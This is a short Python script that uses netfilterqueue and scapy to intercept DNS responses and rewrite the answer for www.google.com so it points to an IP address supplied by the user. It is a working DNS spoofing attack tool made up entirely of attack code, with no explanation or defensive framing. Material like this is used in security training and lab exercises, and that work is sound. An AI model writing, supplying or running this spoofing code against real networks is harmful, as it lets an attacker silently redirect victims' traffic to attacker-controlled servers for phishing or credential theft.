#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy

# Take the spoofed IP address from the user
spoofed_ip = input("Enter the IP address to redirect www.google.com to: ")

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # Check if the packet has a DNS Response
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        if "www.google.com" in qname:
            print("[+] Spoofing target")
            # Create a new DNS response with the spoofed IP
            answer = scapy.DNSRR(rrname=qname, rdata=spoofed_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Remove checksums and lengths to allow Scapy to recalculate them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            # Set the modified packet as payload
            packet.set_payload(bytes(scapy_packet))

    packet.accept()


# Bind to the netfilter queue
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
